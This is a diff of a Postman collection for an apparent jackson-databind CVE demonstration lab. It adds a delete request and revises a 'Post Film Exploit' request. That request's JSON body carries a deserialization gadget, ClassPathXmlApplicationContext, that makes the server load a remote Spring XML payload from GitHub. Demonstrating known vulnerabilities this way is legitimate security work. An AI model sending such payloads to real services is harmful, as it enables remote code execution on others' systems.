@@ -40,7 +40,7 @@
 				],
 				"body": {
 					"mode": "raw",
-					"raw": "{\r\n\t\"name\": \"Freddy vs Json\",\r\n\t\"metadata\": {\r\n\t\t\"score\": 10\r\n\t}\r\n}",
+					"raw": "{\n\t\"title\": \"Freddy vs Json\",\n\t\"director\": \"s3curitybug\",\n\t\"protagonist\": \"Json\",\n\t\"additionalData\": {\n\t\t\"year\": \"2019\"\n\t}\n}",
 					"options": {
 						"raw": {
 							"language": "json"
@@ -65,7 +65,29 @@
 			"response": []
 		},
 		{
-			"name": "Post Film - Exploit",
+			"name": "Delete Film",
+			"request": {
+				"method": "DELETE",
+				"header": [],
+				"url": {
+					"raw": "http://www.jackson-databind-cves.com/api/films/0e5088cb-e5ee-466a-9465-baf5e37245c8",
+					"protocol": "http",
+					"host": [
+						"www",
+						"jackson-databind-cves",
+						"com"
+					],
+					"path": [
+						"api",
+						"films",
+						"0e5088cb-e5ee-466a-9465-baf5e37245c8"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Post Film Exploit",
 			"request": {
 				"method": "POST",
 				"header": [
@@ -78,7 +100,7 @@
 				],
 				"body": {
 					"mode": "raw",
-					"raw": "{\r\n\t\"name\": \"X\",\r\n\t\"metadata\": {\r\n\t\t\"a\": [\r\n\t\t    \"org.springframework.context.support.ClassPathXmlApplicationContext\",\r\n\t\t    \"https://raw.githubusercontent.com/s3curitybug/jackson-databind-cves/master/bean-payload.xml\"\r\n\t\t]\r\n\t}\r\n}",
+					"raw": "{\n\t\"title\": \"title\",\n\t\"director\": \"director\",\n\t\"protagonist\": \"protagonist\",\n\t\"additionalData\": {\n\t\t\"a\": [\n\t\t    \"org.springframework.context.support.ClassPathXmlApplicationContext\",\n\t\t    \"https://raw.githubusercontent.com/s3curitybug/jackson-databind-cves/master/bean-payload-linux.xml\"\n\t\t]\n\t}\n}",
 					"options": {
 						"raw": {
 							"language": "json"
@@ -86,7 +108,7 @@
 					}
 				},
 				"url": {
-					"raw": "http://www.jackson-databind-cves.com/api/films/",
+					"raw": "http://www.jackson-databind-cves.com/api/films",
 					"protocol": "http",
 					"host": [
 						"www",
@@ -95,8 +117,7 @@
 					],
 					"path": [
 						"api",
-						"films",
-						""
+						"films"
 					]
 				}
 			},
